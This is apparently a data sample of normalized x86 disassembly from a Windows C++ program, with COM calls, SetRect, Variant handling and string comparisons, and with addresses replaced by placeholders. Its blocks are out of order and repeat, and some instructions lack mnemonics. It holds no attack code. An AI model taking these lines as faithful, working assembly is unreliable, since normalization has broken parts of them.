xor ecx ecx
jmp r-xdata
mov si [ ecx + 0x2 ]
cmp si [ edx + 0x2 ]
jne r-xdata
mov si [ ecx ]
cmp si [ edx ]
jne r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
cmp si bx
je r-xdata
mov edi [ ebp - 0x10 ]
jmp r-xdata
push 0xc
call [ operator new@IAT ]
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x9
cmp eax ebx
je r-xdata
cmp ecx ebx
jne r-xdata
add ecx 0x4
add edx 0x4
cmp si bx
jne r-xdata
mov edx r--data
mov ecx eax
lea ebx [ ebx ]
mov esi [ ebp - 0x10 ]
cmp esi ebx
jne r-xdata
xor ecx ecx
jmp r-xdata
mov si [ ecx + 0x2 ]
cmp si [ edx + 0x2 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x4 ] 0x8
mov [ ebp - 0x10 ] eax
push eax
call sub_43b630
mov [ ebp - 0x4 ] 0x8
mov [ ebp - 0x10 ] eax
mov edi eax
jmp r-xdata
mov si [ ecx ]
cmp si [ edx ]
jne r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
cmp si bx
je r-xdata
mov eax [ ebp + 0xc ]
push eax
call [ _wtoi@IAT ]
mov ecx [ ebp + 0x10 ]
mov [ esi + 0x4 ] eax
add esp 0x4
mov [ ecx + 0xa4 ] eax
jmp r-xdata
push 0xc
call [ operator new@IAT ]
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0xa
cmp eax ebx
je r-xdata
cmp ecx ebx
jne r-xdata
add ecx 0x4
add edx 0x4
cmp si bx
jne r-xdata
mov ecx r--data
lea ecx [ ecx ]
mov esi [ ebp - 0x10 ]
cmp esi ebx
jne r-xdata
xor ecx ecx
jmp r-xdata
mov si [ ecx + 0x2 ]
cmp si [ edx + 0x2 ]
jne r-xdata
xor eax eax
push eax
call sub_43b630
jmp r-xdata
mov si [ ecx ]
cmp si [ edx ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp dx bx
je r-xdata
mov eax [ ebp + 0xc ]
mov ecx r--data
push 0xc
call [ operator new@IAT ]
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0xb
cmp eax ebx
je r-xdata
cmp ecx ebx
jne r-xdata
add ecx 0x4
add edx 0x4
cmp si bx
jne r-xdata
mov [ ebp - 0x4 ] 0x8
mov esi eax
mov [ ebp - 0x10 ] esi
mov edi [ ebp + 0x10 ]
add edi 0x98
xor eax eax
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
xor edx edx
cmp eax ebx
sete dl
mov [ esi + 0x8 ] edx
jmp r-xdata
cmp dx bx
je r-xdata
xor eax eax
push eax
call sub_43b630
jmp r-xdata
mov si [ ecx ]
cmp si [ edx ]
jne r-xdata
cmp eax ebx
jne r-xdata
add eax 0x4
add ecx 0x4
cmp dx bx
jne r-xdata
xor edx edx
xor eax eax
cmp eax ebx
sete dl
mov [ esi + 0x8 ] edx
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
mov [ ebp - 0x4 ] 0x8
mov esi eax
mov [ ebp - 0x10 ] esi
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
add eax 0x4
add ecx 0x4
cmp dx bx
jne r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
sub_43c5d0
push ebp
mov ebp esp
push 0xffffffff
push sub_44bbd2
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ebx edx
test ebx ebx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
test esi esi
je r-xdata
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x4 ] 0x1
mov eax [ ebx ]
mov edx [ eax + 0x44 ]
lea ecx [ ebp - 0x14 ]
push ecx
push ebx
call edx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
push eax
push esi
push ebx
push ecx
mov ecx [ ebp + 0xc ]
call sub_43b6a0
mov edx [ ebp - 0x14 ]
push 0x0
push r--data
push r--data
push edx
call sub_428790
push 0x0
push r--data
mov [ esi + 0x185 ] al
mov eax [ ebp - 0x14 ]
push r--data
push eax
call sub_428790
mov edx [ ebp - 0x14 ]
test al al
sete cl
push edx
lea ebx [ ebp - 0x1c ]
mov [ esi + 0x186 ] cl
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] 0x0
call sub_428bc0
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x1c ]
push eax
push ecx
push 0x0
push 0x0
add esi 0x164
push esi
call [ SetRect@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_43c710
push ebp
mov ebp esp
push 0xffffffff
push sub_44b79e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x64
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov edi edx
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x6c ] ecx
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn 0x8
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x4 ] 0x1
mov edx [ eax ]
mov edx [ edx + 0x44 ]
lea ecx [ ebp - 0x44 ]
push ecx
push eax
call edx
mov eax [ ebp - 0x44 ]
cmp eax ebx
jne r-xdata
push r--data
push edi
add esi 0xc4
mov edi eax
call sub_428c90
mov eax [ ebp - 0x44 ]
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x5c ] ebx
push eax
lea ebx [ ebp - 0x60 ]
call sub_428af0
mov eax [ ebp - 0x6c ]
mov ebx [ ebp - 0x58 ]
mov ecx [ ebp - 0x60 ]
mov edx [ ebp - 0x5c ]
mov edi [ ebp - 0x50 ]
push eax
push 0x0
mov [ ebx + 0x198 ] ecx
mov [ ebx + 0x19c ] edx
mov edx [ ebp - 0x44 ]
push edi
mov ecx r--data
call sub_43cba0
push r--data
push edi
mov edi [ ebp - 0x44 ]
lea esi [ ebx + 0x174 ]
call sub_428c90
mov ecx [ ebp - 0x44 ]
mov edi ebx
lea ebx [ edi + 0x80 ]
push ebx
push r--data
push ecx
call sub_428a20
mov edx [ ebp - 0x44 ]
lea esi [ edi + 0x70 ]
push esi
push r--data
push edx
mov [ esi ] 0xffffffff
call sub_428a20
mov eax [ esi ]
mov edx [ ebp - 0x44 ]
mov ecx [ ebx ]
mov [ edi + 0x18c ] eax
lea eax [ edi + 0x190 ]
push eax
push r--data
push edx
mov [ eax ] ecx
call sub_428a20
mov eax [ ebp - 0x44 ]
xor esi esi
push esi
push r--data
push r--data
push eax
call sub_428790
mov ecx [ ebp - 0x44 ]
push esi
push r--data
push r--data
push ecx
mov [ edi + 0x187 ] al
call sub_428790
mov [ edi + 0x188 ] al
mov [ ebp - 0x4c ] esi
mov bl 0x4
mov [ ebp - 0x4 ] bl
mov eax [ ebp - 0x44 ]
mov edx [ eax ]
mov edx [ edx + 0x1c ]
lea ecx [ ebp - 0x4c ]
push ecx
push r--data
push eax
call edx
cmp [ ebp - 0x4c ] esi
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x44 ]
cmp eax ebx
jmp r-xdata
mov [ ebp - 0x48 ] esi
mov [ ebp - 0x4 ] 0x7
mov eax [ ebp - 0x54 ]
mov edx [ eax ]
mov edx [ edx + 0x94 ]
lea ecx [ ebp - 0x48 ]
push ecx
push r--data
push eax
mov [ ebp - 0x40 ] esi
mov [ ebp - 0x3c ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x30 ] esi
mov [ ebp - 0x2c ] esi
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] esi
call edx
mov ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x50 ]
lea eax [ ebp - 0x40 ]
push eax
push ecx
push edx
lea esi [ ebp - 0x20 ]
lea ebx [ ebp - 0x30 ]
call sub_429700
mov eax [ ebp - 0x40 ]
mov ecx [ ebp - 0x3c ]
mov edx [ ebp - 0x38 ]
mov [ edi + 0xd4 ] eax
mov eax [ ebp - 0x34 ]
mov [ edi + 0xd8 ] ecx
mov ecx [ ebp - 0x30 ]
mov [ edi + 0xdc ] edx
mov edx [ ebp - 0x2c ]
mov [ edi + 0xe4 ] ecx
mov ecx [ ebp - 0x24 ]
mov [ edi + 0xe0 ] eax
mov eax [ ebp - 0x28 ]
mov [ edi + 0xe8 ] edx
mov edx [ ebp - 0x20 ]
mov [ edi + 0xec ] eax
mov eax [ ebp - 0x1c ]
mov [ edi + 0xf4 ] edx
mov edx [ ebp - 0x14 ]
mov [ edi + 0xf8 ] eax
mov eax [ ebp - 0x48 ]
mov [ edi + 0xf0 ] ecx
mov ecx [ ebp - 0x18 ]
mov [ edi + 0xfc ] ecx
mov [ edi + 0x100 ] edx
test eax eax
je r-xdata
lea eax [ ebp - 0x68 ]
push eax
call [ VariantInit@IAT ]
mov [ ebp - 0x4 ] 0x5
mov eax [ ebp - 0x4c ]
mov ecx [ eax ]
lea edx [ ebp - 0x68 ]
push edx
push eax
mov eax [ ecx + 0x20 ]
call eax
cmp eax esi
jl r-xdata
je r-xdata
mov eax [ ebp - 0x54 ]
mov ecx [ eax ]
lea edx [ ebp - 0x48 ]
push edx
push r--data
push eax
mov eax [ ecx + 0x94 ]
call eax
mov edx [ ebp - 0x48 ]
mov eax [ ebp - 0x50 ]
lea ecx [ ebp - 0x40 ]
push ecx
push edx
push eax
lea esi [ ebp - 0x20 ]
lea ebx [ ebp - 0x30 ]
call sub_429700
mov ecx [ ebp - 0x40 ]
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x38 ]
mov [ edi + 0x104 ] ecx
mov ecx [ ebp - 0x34 ]
mov [ edi + 0x108 ] edx
mov edx [ ebp - 0x30 ]
mov [ edi + 0x10c ] eax
mov eax [ ebp - 0x2c ]
mov [ edi + 0x114 ] edx
mov edx [ ebp - 0x24 ]
mov [ edi + 0x118 ] eax
mov eax [ ebp - 0x20 ]
mov [ edi + 0x110 ] ecx
mov ecx [ ebp - 0x28 ]
mov [ edi + 0x124 ] eax
mov eax [ ebp - 0x14 ]
mov [ edi + 0x11c ] ecx
mov ecx [ ebp - 0x1c ]
mov [ edi + 0x120 ] edx
mov edx [ ebp - 0x18 ]
mov [ edi + 0x128 ] ecx
mov [ edi + 0x12c ] edx
mov [ edi + 0x130 ] eax
mov eax [ ebp - 0x48 ]
test eax eax
je r-xdata
mov [ ebp - 0x48 ] 0x0
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x4 ] bl
lea ecx [ ebp - 0x68 ]
push ecx
call [ VariantClear@IAT ]
mov eax [ ebp - 0x60 ]
cmp eax esi
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x54 ]
mov ecx [ eax ]
lea edx [ ebp - 0x48 ]
push edx
push r--data
push eax
mov eax [ ecx + 0x94 ]
call eax
mov edx [ ebp - 0x48 ]
mov eax [ ebp - 0x50 ]
lea ecx [ ebp - 0x40 ]
push ecx
push edx
push eax
lea esi [ ebp - 0x20 ]
lea ebx [ ebp - 0x30 ]
call sub_429700
mov ecx [ ebp - 0x40 ]
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x38 ]
mov [ edi + 0x134 ] ecx
mov ecx [ ebp - 0x34 ]
mov [ edi + 0x138 ] edx
mov edx [ ebp - 0x30 ]
mov [ edi + 0x13c ] eax
mov eax [ ebp - 0x2c ]
mov [ edi + 0x144 ] edx
mov edx [ ebp - 0x24 ]
mov [ edi + 0x148 ] eax
mov eax [ ebp - 0x20 ]
mov [ edi + 0x140 ] ecx
mov ecx [ ebp - 0x28 ]
mov [ edi + 0x154 ] eax
mov eax [ ebp - 0x14 ]
mov [ edi + 0x14c ] ecx
mov ecx [ ebp - 0x1c ]
mov [ edi + 0x150 ] edx
mov edx [ ebp - 0x18 ]
mov [ edi + 0x158 ] ecx
mov [ edi + 0x15c ] edx
mov [ edi + 0x160 ] eax
mov eax [ ebp - 0x48 ]
test eax eax
je r-xdata
mov [ ebp - 0x48 ] 0x0
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
push r--data
push eax
call [ _wcsicmp@IAT ]
add esp 0x8
test eax eax
jne r-xdata
mov eax [ ebp - 0x44 ]
push 0x0
push r--data
push r--data
push eax
call sub_428790
mov [ edi + 0x189 ] al
mov [ ebp - 0x4 ] 0x4
mov eax [ ebp - 0x48 ]
test eax eax
je r-xdata
mov [ ebp - 0x48 ] 0x0
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ edi + 0x194 ] 0x1
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x4c ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x44 ]
test eax eax
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_43cba0
push ebp
mov ebp esp
push 0xffffffff
push sub_44ab78
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov edi edx
test ebx ebx
je r-xdata
mov eax 0x80004005
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
test edi edi
je r-xdata
test esi esi
je r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
add eax 0x10
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x1
push esi
push edi
lea edi [ ebp - 0x10 ]
call sub_428960
mov edi [ ebp - 0x10 ]
mov esi eax
test esi esi
js r-xdata
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ edi - 0x10 ]
lea edx [ eax + 0xc ]
or ecx 0xffffffff
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
push eax
push ecx
mov ecx [ ebp + 0x8 ]
push ebx
mov eax edi
call sub_43cc80
mov esi eax
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_43cc80
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea edi [ ecx + 0x14 ]
movzx ecx [ eax + 0xaa ]
push ecx
push ebx
call sub_43b020
mov esi eax
test esi esi
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
cmp [ eax + 0x8 ] esi
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ebx [ ebp + 0x8 ]
inc [ esi + 0x4 ]
lea edx [ ebp + 0xc ]
add ebx 0xb0
mov [ ebp + 0xc ] eax
call sub_43ce90
mov [ eax ] esi
mov ecx [ eax + 0x8 ]
mov edx [ ecx ]
mov edx [ edx + 0x10 ]
lea eax [ ebp - 0x4 ]
push eax
push ebx
call edx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov cl [ ecx + 0xaa ]
push ebx
mov ebx eax
mov esi edi
call sub_43acc0
mov esi eax
test esi esi
jne r-xdata
mov ecx ebx
dec [ ecx + 0x4 ]
jne r-xdata
mov eax 0x80004005
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
sub_43cd40
push ebp
mov ebp esp
push 0xffffffff
push sub_44ab38
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
test esi esi
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
xor ebx ebx
call edx
add eax 0x10
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x1
push r--data
push esi
lea edi [ ebp - 0x10 ]
call sub_428960
mov esi [ ebp - 0x10 ]
test eax eax
js r-xdata
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ esi - 0x10 ]
lea edx [ eax + 0xc ]
or ecx 0xffffffff
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
push eax
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_43ce10
mov ebx eax
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_43ce10
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
push 0x1
lea edi [ ecx + 0x14 ]
push ebx
call sub_43b020
mov esi eax
test esi esi
jne r-xdata
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] esi
je r-xdata
mov ecx [ eax + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x10 ]
lea edx [ ebp - 0x4 ]
push edx
push ebx
call eax
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov cl [ ebp + 0x8 ]
push ebx
mov ebx eax
mov esi edi
call sub_43acc0
mov esi eax
test esi esi
jne r-xdata
mov ecx ebx
dec [ ecx + 0x4 ]
jne r-xdata
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
sub_43ce90
push ebp
mov ebp esp
mov ecx [ ebx + 0x4 ]
mov eax [ ecx + 0x4 ]
sub esp 0x8
cmp [ eax + 0x15 ] 0x0
push esi
mov esi ecx
jne r-xdata
cmp esi [ ebx + 0x4 ]
je r-xdata
mov ecx [ edx ]
mov ecx [ edx ]
mov [ ebp - 0x8 ] ecx
push edi
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov [ ebp - 0x4 ] 0x0
call sub_443060
push esi
lea edi [ ebp - 0x4 ]
mov ecx ebx
call sub_43cf00
mov eax [ ebp - 0x4 ]
pop edi
add eax 0x10
pop esi
mov esp ebp
pop ebp
retn
mov eax [ edx ]
cmp eax [ esi + 0xc ]
jge r-xdata
mov esi eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
lea eax [ esi + 0x10 ]
pop esi
mov esp ebp
pop ebp
retn
cmp [ eax + 0xc ] ecx
jge r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_43cf00
push ebp
mov ebp esp
sub esp 0x8
push ebx
mov ebx ecx
cmp [ ebx + 0x8 ] 0x0
push esi
mov esi eax
jne r-xdata
mov eax [ ebx + 0x4 ]
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax ]
jne r-xdata
mov ecx [ ebx + 0x4 ]
push esi
push 0x1
push edi
call sub_442e40
pop esi
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ecx eax
jne r-xdata
mov eax [ esi + 0xc ]
cmp eax [ ecx + 0xc ]
jge r-xdata
mov eax [ esi + 0xc ]
cmp eax [ ecx + 0xc ]
jge r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ ecx + 0xc ]
cmp edx [ esi + 0xc ]
jge r-xdata
push esi
push ebx
lea esi [ ebp - 0x8 ]
call sub_43d020
mov eax [ eax ]
pop esi
mov [ edi ] eax
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push esi
push 0x1
push edi
call sub_442e40
pop esi
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0xc ]
cmp [ ecx + 0xc ] eax
jge r-xdata
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] ecx
call sub_42a5d0
mov ecx [ ebp - 0x4 ]
mov eax [ esi + 0xc ]
cmp [ ecx + 0xc ] eax
jge r-xdata
push esi
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] ecx
call sub_42a030
mov eax [ ebp - 0x4 ]
cmp eax [ ebx + 0x4 ]
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
push esi
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
cmp [ edx + 0x15 ] 0x0
push esi
jne r-xdata
mov ecx [ esi + 0xc ]
cmp ecx [ eax + 0xc ]
jge r-xdata
push 0x0
push edi
call sub_442e40
pop esi
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
push 0x1
push edi
call sub_442e40
pop esi
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push 0x1
push edi
mov ecx eax
call sub_442e40
pop esi
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_43d020
push ebp
mov ebp esp
sub esp 0x8
mov edx [ ebp + 0x8 ]
push ebx
push edi
mov edi [ edx + 0x4 ]
mov eax [ edi + 0x4 ]
cmp [ eax + 0x15 ] 0x0
mov cl 0x1
mov [ ebp - 0x8 ] cl
jne r-xdata
mov ebx edi
mov [ ebp - 0x4 ] ebx
test cl cl
je r-xdata
mov ecx [ ebp + 0xc ]
mov ebx [ ecx + 0xc ]
mov eax [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push eax
cmp ecx [ eax + 0xc ]
jge r-xdata
mov eax [ edx + 0x4 ]
cmp edi [ eax ]
jne r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
jmp r-xdata
call [ operator delete@IAT ]
add esp 0x4
pop edi
mov [ esi ] ebx
mov [ esi + 0x4 ] 0x0
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp + 0xc ]
push ecx
mov ecx edi
mov ebx edx
call sub_442e40
mov edx [ eax ]
pop edi
mov [ esi ] edx
mov [ esi + 0x4 ] 0x1
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x4 ]
call sub_42a5d0
mov ebx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push ecx
push 0x1
lea eax [ ebp + 0xc ]
push eax
mov ecx edi
mov ebx edx
call sub_442e40
mov ecx [ eax ]
pop edi
mov [ esi ] ecx
mov [ esi + 0x4 ] 0x1
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp ebx [ eax + 0xc ]
mov edi eax
setl cl
mov [ ebp - 0x8 ] cl
test cl cl
je r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_43d110
push ebp
mov ebp esp
push 0xffffffff
push sub_447709
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ esi ] r--data
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
lea edi [ esi + 0xc ]
mov ecx rw-data
mov [ ebp - 0x10 ] edi
call edx
add eax 0x10
mov [ edi ] eax
mov [ ebp - 0x4 ] 0x1
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
lea edi [ esi + 0x10 ]
mov ecx rw-data
mov [ ebp - 0x10 ] edi
call edx
add eax 0x10
mov [ edi ] eax
mov [ ebp - 0x4 ] 0x3
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
lea edi [ esi + 0x14 ]
mov ecx rw-data
mov [ ebp - 0x10 ] edi
call edx
add eax 0x10
mov [ edi ] eax
mov [ ebp - 0x4 ] 0x5
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x18 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
sub_43d1d0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_43d200
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_43d200
push ebp
mov ebp esp
push 0xffffffff
push sub_445759
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov ecx 0x1
mov [ ebp - 0x4 ] ecx
lea eax [ esi + 0x14 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
sub eax 0x10
or edi 0xffffffff
lea ecx [ eax + 0xc ]
mov edx edi
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
xor cl cl
mov [ ebp - 0x4 ] cl
lea eax [ esi + 0x10 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
mov edx edi
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ ebp - 0x4 ] edi
lea eax [ esi + 0xc ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] edi
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
[ ecx ] edi
dec edi
test edi edi
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_43d2d0
push ebp
mov ebp esp
push 0xffffffff
push sub_44a494
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ecx [ esi + 0x8 ]
test ecx ecx
je r-xdata
mov eax [ edi ]
cmp eax 0x1
jne r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
mov ecx [ esi + 0x8 ]
test ecx ecx
je r-xdata
cmp eax 0x2
jne r-xdata
push 0x2c
call [ operator new@IAT ]
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov [ esi + 0x8 ] 0x0
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
push 0x4c
call [ operator new@IAT ]
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x2
test eax eax
je r-xdata
push 0x74
call [ operator new@IAT ]
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
xor eax eax
push eax
call sub_441040
jmp r-xdata
push eax
call sub_441f40
jmp r-xdata
push eax
call sub_441a90
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ esi + 0x14 ]
